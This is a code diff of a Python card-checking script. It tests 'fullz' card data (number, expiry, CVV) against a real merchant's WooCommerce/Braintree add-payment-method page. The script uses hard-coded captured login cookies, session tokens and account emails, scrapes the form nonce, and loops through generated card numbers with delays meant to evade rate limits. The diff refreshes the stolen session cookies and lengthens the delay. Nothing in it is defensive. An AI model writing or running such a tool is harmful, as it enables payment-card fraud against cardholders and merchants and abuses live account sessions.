@@ -78,86 +78,6 @@ def is_valid_credit_card_number(number: str) -> bool:
 
     return total % 10 == 0
 
-import base64
-import httpx
-import random
-import time
-import json
-import uuid
-import asyncio
-from bs4 import BeautifulSoup
-from html import unescape
-import re
-
-
-def gets(s, start, end):
-    try:
-        start_index = s.index(start) + len(start)
-        end_index = s.index(end, start_index)
-        return s[start_index:end_index]
-    except ValueError:
-        return None
-
-
-def extract_braintree_token(response_text):
-    pattern = r'wc_braintree_client_token\s*=\s*\["([^"]+)"\]'
-    match = re.search(pattern, response_text)
-    if not match:
-        return None
-
-    token_base64 = match.group(1)
-
-    try:
-        decoded_json = base64.b64decode(token_base64).decode('utf-8')
-        data = json.loads(decoded_json)
-        return data
-    except Exception as e:
-        print(f"Error decoding or parsing JSON token: {e}")
-        return None
-
-
-def validate_expiry_date(mes, ano):
-    mes = mes.zfill(2)
-    if len(ano) == 4:
-        ano = ano[-2:]
-
-    try:
-        expiry_month = int(mes)
-        expiry_year = int(ano)
-    except ValueError:
-        return False, "Invalid expiry date"
-
-    current_year = int(time.strftime("%y"))
-    current_month = int(time.strftime("%m"))
-
-    if expiry_month < 1 or expiry_month > 12:
-        return False, "Expiration Month Invalid"
-    if expiry_year < current_year:
-        return False, "Expiration Year Invalid"
-    if expiry_year == current_year and expiry_month < current_month:
-        return False, "Expiration Month Invalid"
-
-    return True, ""
-
-
-def is_valid_credit_card_number(number: str) -> bool:
-    number = number.replace(" ", "").replace("-", "")
-    if not number.isdigit():
-        return False
-
-    total = 0
-    reverse_digits = number[::-1]
-
-    for i, digit in enumerate(reverse_digits):
-        n = int(digit)
-        if i % 2 == 1:
-            n = n * 2
-            if n > 9:
-                n = n - 9
-        total += n
-
-    return total % 10 == 0
-
 async def create_payment_method(fullz, session):
     try:
         cc, mes, ano, cvv = fullz.split("|")
@@ -167,25 +87,26 @@ async def create_payment_method(fullz, session):
 
         # Cookies
         cookies = {
-            '_ga': 'GA1.1.333862603.1756374247',
-            '_gcl_au': '1.1.1881747356.1756374247',
-            'mailchimp_user_email': 'zerotracehacked%40gmail.com',
+            'mailchimp_landing_site': 'https%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F',
             'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_first_add': 'fd%3D2025-08-31%2005%3A24%3A32%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOopYzTPOS7xH5nYM1WtqvxvNJJm-dp9XEOiXG7fHqYklIRiy7EgB%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_current': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'sbjs_first': 'typ%3Dorganic%7C%7C%7Csrc%3Dgoogle%7C%7C%7Cmdm%3Dorganic%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
-            'mailchimp_landing_site': 'https%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOoq8FJ6vCoYvJ09H23EDOT6KZUY9kpjaAgQiQSptUqge3sfo4zuV',
-            'sbjs_current_add': 'fd%3D2025-08-31%2007%3A15%3A27%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2F%3Fsrsltid%3DAfmBOoq8FJ6vCoYvJ09H23EDOT6KZUY9kpjaAgQiQSptUqge3sfo4zuV%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.google.com%2F',
-            'sbjs_udata': 'vst%3D2%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Safari%2F537.36',
+            'sbjs_current_add': 'fd%3D2025-08-28%2010%3A25%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_first_add': 'fd%3D2025-08-28%2010%3A25%3A47%7C%7C%7Cep%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2F%7C%7C%7Crf%3D%28none%29',
+            'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+            '_gcl_au': '1.1.403858930.1756376751',
+            '_ga': 'GA1.1.1790710832.1756376751',
+            'mailchimp.cart.previous_email': 'zerotracehacked@gmail.com',
             'Subscribe': 'true',
-            'mailchimp.cart.current_email': 'zerotracehacked@gmail.com',
+            'wordpress_test_cookie': 'WP%20Cookie%20check',
+            'mailchimp.cart.current_email': 'senryjo@onionmail.org',
+            'mailchimp_user_previous_email': 'senryjo%40onionmail.org',
+            'mailchimp_user_email': 'senryjo%40onionmail.org',
+            'sbjs_udata': 'vst%3D7%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F138.0.0.0%20Safari%2F537.36',
             'breeze_folder_name': '6bae3cd94ddbfe28435ae88815e64956a5198266',
-            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'zerotracehacked%7C1756799157%7CnD7FW8DApW206UkwUXq1XATEYHjrDHTxQZ63YEPncx2%7Ca2e5f8502ab08d7c15b7381d6ecac1c3d5c4e3dd10a025c27e5a4856fd28948d',
-            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8961%7Cother%7Cread%7C314e7ddb46839835096721fc54c20706a06c35f06c4594bd9475cb8d74eef37f',
-            'cfzs_google-analytics_v4': '%7B%22uoEf_pageviewCounter%22%3A%7B%22v%22%3A%226%22%7D%7D',
-            '_ga_D1Q49TMJ2C': 'GS2.1.s1756625842$o4$g1$t1756626377$j9$l0$h0',
-            'sbjs_session': 'pgs%3D5%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
-            'cfz_google-analytics_v4': '%7B%22uoEf_engagementDuration%22%3A%7B%22v%22%3A%220%22%2C%22e%22%3A1788162376004%7D%2C%22uoEf_engagementStart%22%3A%7B%22v%22%3A1756626385286%2C%22e%22%3A1788162383639%7D%2C%22uoEf_counter%22%3A%7B%22v%22%3A%2267%22%2C%22e%22%3A1788162376004%7D%2C%22uoEf_session_counter%22%3A%7B%22v%22%3A%224%22%2C%22e%22%3A1788162376004%7D%2C%22uoEf_ga4%22%3A%7B%22v%22%3A%226d94b6c7-8ebe-4002-b4c6-d90aedcc23c4%22%2C%22e%22%3A1788162376004%7D%2C%22uoEf__z_ga_audiences%22%3A%7B%22v%22%3A%226d94b6c7-8ebe-4002-b4c6-d90aedcc23c4%22%2C%22e%22%3A1787910244633%7D%2C%22uoEf_let%22%3A%7B%22v%22%3A%221756626376004%22%2C%22e%22%3A1788162376004%7D%2C%22uoEf_ga4sid%22%3A%7B%22v%22%3A%221103853429%22%2C%22e%22%3A1756628176004%7D%7D',
+            'wordpress_logged_in_9af923add3e33fe261964563a4eb5c9b': 'rehalesson%7C1756793502%7CUjEMqQWaNHUWMQwwFkTMM3zW5EOOMAv6OYQybasjPgK%7Cb17d37f5414fc65fe05da0632584a1fd6fd144967eb3237ba5aa098baf2a39e5',
+            'wfwaf-authcookie-428ce1eeac9307d8349369ddc6c2bb5f': '8979%7Cother%7Cread%7C830d49951dadcaebacb5f5341a25b1a7bc585db9ca2f5ec1ca48a960d7cda91b',
+            '_ga_D1Q49TMJ2C': 'GS2.1.s1756620390$o7$g1$t1756620728$j35$l0$h0',
+            'sbjs_session': 'pgs%3D4%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fapluscollectibles.com%2Fmy-account%2Fpayment-methods%2F',
         }
 
         headers = {
@@ -193,20 +114,18 @@ async def create_payment_method(fullz, session):
             'accept-language': 'en-US,en;q=0.9',
             'priority': 'u=0, i',
             'referer': 'https://apluscollectibles.com/my-account/payment-methods/',
-            'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Linux"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
+            'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
         }
 
         response = await session.get('https://apluscollectibles.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
-    except Exception as e:
-        print(f"An error occurred: {e}")
 
         nonce = gets(response.text, '<input type="hidden" id="woocommerce-add-payment-method-nonce" name="woocommerce-add-payment-method-nonce" value="', '"')
 
@@ -338,7 +257,6 @@ async def create_payment_method(fullz, session):
     except Exception as e:
         return str(e)
 
-
 async def multi_checking(x):
     cc, mes, ano, cvv = x.split("|")
     if not is_valid_credit_card_number(cc):
@@ -412,7 +330,7 @@ async def main():
             new_cc = f"{cc_num}|{month}|{year}|{cvv}"
             result = await multi_checking(new_cc)
             print(result)
-            await asyncio.sleep(20)
+            await asyncio.sleep(30)
 
 
 if __name__ == "__main__":
